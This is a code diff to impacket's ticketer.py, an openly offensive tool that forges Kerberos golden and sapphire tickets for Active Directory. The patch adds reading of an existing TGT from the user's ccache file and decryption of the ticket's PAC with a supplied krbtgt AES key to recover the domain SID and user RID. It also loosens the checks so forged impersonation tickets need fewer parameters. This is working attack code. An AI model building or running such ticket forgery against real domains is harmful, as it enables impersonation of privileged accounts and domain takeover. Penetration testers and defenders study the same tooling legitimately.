@@ -325,20 +325,151 @@ class TICKETER:
 
     def createBasicTicket(self):
         if self.__options.request is True:
-            if self.__domain == self.__server:
-                logging.info('Requesting TGT to target domain to use as basis')
+            # Support for Kerberos ccache (-k flag)
+            if self.__options.k:
+                logging.info('Extracting info from existing TGT')
+                from impacket.krb5.ccache import CCache
+                import os
+                
+                # Load ccache
+                ccache_path = os.getenv('KRB5CCNAME')
+                if ccache_path:
+                    if ccache_path.startswith('FILE:'):
+                        ccache_path = ccache_path[5:]
+                    ccache = CCache.loadFile(ccache_path)
+                else:
+                    # Default location
+                    ccache = CCache.loadFile('/tmp/krb5cc_%d' % os.getuid())
+                
+                # Get TGT from ccache
+                creds = None
+                if self.__domain:
+                    # If domain is provided, look for specific TGT
+                    domain_upper = self.__domain.upper()
+                    for cred in ccache.credentials:
+                        server_principal = cred['server'].prettyPrint().decode()
+                        if server_principal.startswith(f'krbtgt/{domain_upper}@'):
+                            creds = cred
+                            break
+                else:
+                    # If domain not provided, find any TGT and extract domain from it
+                    for cred in ccache.credentials:
+                        server_principal = cred['server'].prettyPrint().decode()
+                        # Look for krbtgt/DOMAIN@DOMAIN pattern
+                        if server_principal.startswith('krbtgt/'):
+                            creds = cred
+                            # Extract domain from the TGT server principal
+                            # Format is: krbtgt/DOMAIN@DOMAIN
+                            domain_from_tgt = server_principal.split('@')[1]
+                            self.__domain = domain_from_tgt.lower()
+                            self.__options.domain = domain_from_tgt.lower()  # Also set options.domain
+                            self.__server = self.__domain  # Update server as well for golden tickets
+                            break
+                
+                if creds is None:
+                    if self.__domain:
+                        logging.critical(f'No valid TGT found in ccache for {self.__domain.upper()}!')
+                    else:
+                        logging.critical('No valid TGT found in ccache!')
+                    return None, None
+                
+                # Extract username from ccache if not provided
+                if not self.__options.user:
+                    self.__options.user = ccache.principal.prettyPrint().decode().split('@')[0]
+                
+                # Build TGT from ccache
+                # The toTGT() method returns a dict with 'KDC_REP' and 'sessionKey' keys
+                try:
+                    # Extract TGT using the same method as describeTicket.py
+                    rawTicket = creds.toTGT()
+                    tgt = rawTicket['KDC_REP']
+                    # Session key is already in the creds object, but we can also get it from rawTicket
+                    
+                except Exception as e:
+                    logging.critical(f'Failed to extract TGT from ccache: {e}')
+                    logging.debug('Exception details:', exc_info=True)
+                    return None, None
+                
+                cipher = _enctype_table[creds['key']['keytype']]
+                sessionKey = Key(creds['key']['keytype'], creds['key']['keyvalue'])
+                
+                # If we have the krbtgt AES key, decrypt the ticket and extract domain info from PAC
+                if self.__options.aesKey and (not self.__options.domain_sid or not self.__options.user_id):
+                    try:
+                        # Decode the TGT
+                        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+                        
+                        # Decrypt the ticket
+                        cipherText = decodedTGT['ticket']['enc-part']['cipher']
+                        ticketCipher = _enctype_table[int(decodedTGT['ticket']['enc-part']['etype'])]
+                        
+                        # Determine the correct key based on encryption type
+                        if ticketCipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+                            key = Key(ticketCipher.enctype, unhexlify(self.__options.aesKey))
+                        elif ticketCipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+                            key = Key(ticketCipher.enctype, unhexlify(self.__options.aesKey))
+                        else:
+                            logging.warning('TGT uses RC4 encryption, cannot decrypt without nthash')
+                            key = None
+                        
+                        if key:
+                            plainText = ticketCipher.decrypt(key, 2, cipherText)
+                            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+                            
+                            # Extract PAC
+                            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
+                            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
+                            
+                            # Parse PAC buffers
+                            buff = pacType['Buffers']
+                            for bufferN in range(pacType['cBuffers']):
+                                infoBuffer = pac.PAC_INFO_BUFFER(buff)
+                                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
+                                buff = buff[len(infoBuffer):]
+                                
+                                if infoBuffer['ulType'] == PAC_LOGON_INFO:
+                                    # Parse the VALIDATION_INFO from PAC_LOGON_INFO
+                                    validationInfo = VALIDATION_INFO()
+                                    validationInfo.fromString(data)
+                                    lenVal = len(validationInfo.getData())
+                                    validationInfo.fromStringReferents(data, lenVal)
+                                    
+                                    # Extract domain SID if not provided
+                                    if not self.__options.domain_sid:
+                                        logonDomainId = validationInfo['Data']['LogonDomainId'].formatCanonical()
+                                        self.__options.domain_sid = logonDomainId
+                                        logging.info(f'Domain SID: {logonDomainId}')
+                                    
+                                    # Extract user RID if not provided
+                                    if not self.__options.user_id:
+                                        userId = str(validationInfo['Data']['UserId'])
+                                        self.__options.user_id = userId
+                                    
+                                    # Always display the FQDN domain name
+                                    logging.info(f'Domain Name: {self.__domain}')
+                                    
+                                    break
+                    except Exception as e:
+                        logging.warning(f'Failed to extract domain info from TGT PAC: {e}')
+                        logging.debug('Exception details:', exc_info=True)
+                
             else:
-                logging.info('Requesting TGT/TGS to target domain to use as basis')
-
-            if self.__options.hashes is not None:
-                lmhash, nthash = self.__options.hashes.split(':')
-            else:
-                lmhash = ''
-                nthash = ''
-            userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                    unhexlify(lmhash), unhexlify(nthash), None,
-                                                                    self.__options.dc_ip)
+                # Original password/hash authentication
+                if self.__domain == self.__server:
+                    logging.info(f'Requesting TGT from {self.__domain}')
+                else:
+                    logging.info('Requesting TGT/TGS to target domain to use as basis')
+                    
+                if self.__options.hashes is not None:
+                    lmhash, nthash = self.__options.hashes.split(':')
+                else:
+                    lmhash = ''
+                    nthash = ''
+                userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                        unhexlify(lmhash), unhexlify(nthash), None,
+                                                                        self.__options.dc_ip)
+            
             self.__tgt, self.__tgt_cipher, self.__tgt_session_key = tgt, cipher, sessionKey
             if self.__domain == self.__server:
                 kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
@@ -571,7 +702,7 @@ class TICKETER:
 
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
-        serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+        serverName = Principal(self.__options.user, str(self.__domain).upper(), type=constants.PrincipalNameType.NT_UNKNOWN.value)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = str(decodedTGT['crealm'])
@@ -595,8 +726,6 @@ class TICKETER:
 
 
     def customizeTicket(self, kdcRep, pacInfos):
-        logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))
-
         ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=int(self.__options.duration))
 
         if self.__options.impersonate:
@@ -604,12 +733,14 @@ class TICKETER:
             # todo : in its actual form, ticketer is limited to the PAC structures that are supported in impacket.
             #  Unsupported structures will be ignored. The PAC is not completely copy-pasted here.
 
+            # Always use "Modifying" for sapphire tickets
+            logging.info('Modifying TGT PAC structures')
+
             # 1. S4U2Self + U2U
             logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
             tgs, cipher, oldSessionKey, sessionKey = self.getKerberosS4U2SelfU2U()
 
-            # 2. extract PAC
-            logging.info('\tDecrypting ticket & extracting PAC')
+            # 2. extract PAC (no logging - happens internally)
             decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
             cipherText = decodedTicket['ticket']['enc-part']['cipher']
             newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]
@@ -686,6 +817,9 @@ class TICKETER:
                 encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
 
         else:
+            # Non-sapphire ticket customization
+            logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))
+            
             encTicketPart = EncTicketPart()
 
             flags = list()
@@ -1111,8 +1245,8 @@ if __name__ == '__main__':
                                                      ' be generated for. if omitted, golden ticket will be created')
     parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                         'changing only the supplied information. It requires specifying -user')
-    parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
-    parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
+    parser.add_argument('-domain', action='store', help='the fully qualified domain name (e.g. contoso.com)')
+    parser.add_argument('-domain-sid', action='store', help='Domain SID of the target domain the ticker will be '
                                                             'generated for')
     parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                              '(128 or 256 bits)')
@@ -1137,6 +1271,10 @@ if __name__ == '__main__':
                                                      'different from domain/username')
     group.add_argument('-password', action="store", help='password for domain/username')
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
+                       'ones specified in the command line')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                        'ommited it use the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
@@ -1164,9 +1302,12 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts, options.debug)
 
+    # Validate domain requirement (can be extracted from TGT in specific scenarios)
     if options.domain is None:
-        logging.critical('Domain should be specified!')
-        sys.exit(1)
+        # Domain can only be omitted if using -k with -aesKey for sapphire tickets
+        if not (options.k and options.aesKey and options.impersonate):
+            logging.critical('Domain should be specified!')
+            sys.exit(1)
 
     if options.aesKey is None and options.nthash is None and options.keytab is None:
         logging.error('You have to specify either aesKey, or nthash, or keytab')
@@ -1176,56 +1317,71 @@ if __name__ == '__main__':
         logging.error('You cannot specify both -aesKey and -nthash w/o using -request. Pick only one')
         sys.exit(1)
 
-    if options.request is True and options.user is None:
-        logging.error('-request parameter needs -user to be specified')
+    if options.request is True and options.user is None and not options.k:
+        logging.error('-request parameter needs -user to be specified (or use -k for ccache)')
         sys.exit(1)
 
-    if options.request is True and options.hashes is None and options.password is None:
+    if options.request is True and options.hashes is None and options.password is None and not options.k and not options.no_pass:
         from getpass import getpass
         password = getpass("Password:")
     else:
         password = options.password
 
     if options.impersonate:
-        # args that can't be None: -aesKey, -domain-sid, -nthash, -request, -domain, -user, -password
-        # -user-id can't be None except if -old-pac is set
-        # args that can't be False: -request
-        missing_params = [
-            param_name
-            for (param, param_name) in
-            zip(
-                [
-                    options.request,
-                    options.aesKey, options.nthash,
-                    options.domain, options.user, options.password,
-                    options.domain_sid, options.user_id
-                ],
-                [
-                    "-request",
-                    "-aesKey", "-nthash",
-                    "-domain", "-user", "-password",
-                    "-domain-sid", "-user-id"
+        # Validate sapphire ticket requirements
+        logging.info("Generating sapphire ticket ...\n")
+        
+        # When using -k with -aesKey, domain, domain-sid and user-id can be extracted from TGT
+        if options.k:
+            if options.aesKey:
+                # With AES key, we can extract domain, domain-sid and user-id from TGT PAC
+                required_params = [
+                    (options.request, "-request"),
+                    (options.aesKey or options.nthash, "-aesKey or -nthash")
                 ]
-            )
-            if param is None or (param_name == "-request" and not param)
-        ]
+                # Don't print individual "will be extracted" messages - will show actual values later
+            else:
+                # Without AES key, we need all parameters
+                required_params = [
+                    (options.request, "-request"),
+                    (options.aesKey or options.nthash, "-aesKey or -nthash"),
+                    (options.domain, "-domain"),
+                    (options.domain_sid, "-domain-sid"),
+                    (options.user_id, "-user-id")
+                ]
+        else:
+            required_params = [
+                (options.request, "-request"),
+                (options.aesKey, "-aesKey"),
+                (options.nthash, "-nthash"),
+                (options.domain, "-domain"),
+                (options.user, "-user"),
+                (options.password or options.hashes, "-password or -hashes"),
+                (options.domain_sid, "-domain-sid"),
+                (options.user_id, "-user-id")
+            ]
+        
+        missing_params = [param_name for (param, param_name) in required_params if not param]
+        
         if missing_params:
-            logging.error(f"missing parameters to do sapphire ticket : {', '.join(missing_params)}")
+            logging.error(f"missing parameters for sapphire ticket: {', '.join(missing_params)}")
             sys.exit(1)
-        if not options.old_pac and not options.user_id:
-            logging.error(f"missing parameter -user-id. Must be set if not doing -old-pac")
-            sys.exit(1)
-        # ignored params: -extra-pac, -extra-sid, -groups, -duration
-        # -user-id ignored if -old-pac
+        
+        # Log ignored parameters at debug level
         ignored_params = []
-        if options.extra_pac: ignored_params.append("-extra-pac")
-        if options.extra_sid is not None: ignored_params.append("-extra-sid")
-        if options.groups is not None: ignored_params.append("-groups")
-        if options.duration is not None: ignored_params.append("-duration")
+        if options.extra_pac:
+            ignored_params.append("-extra-pac")
+        if options.extra_sid is not None:
+            ignored_params.append("-extra-sid")
+        if options.groups != '513, 512, 520, 518, 519':
+            ignored_params.append("-groups")
+        if options.duration != '87600':
+            ignored_params.append("-duration")
         if ignored_params:
-            logging.error(f"doing sapphire ticket, ignoring following parameters : {', '.join(ignored_params)}")
+            logging.debug("Note: The following parameters are ignored in sapphire tickets: %s", ', '.join(ignored_params))
+        
         if options.old_pac and options.user_id is not None:
-            logging.error(f"parameter -user-id will be ignored when specifying -old-pac in a sapphire ticket attack")
+            logging.debug("Note: -user-id will be ignored when specifying -old-pac in a sapphire ticket")
 
     try:
         executer = TICKETER(options.target, password, options.domain, options)
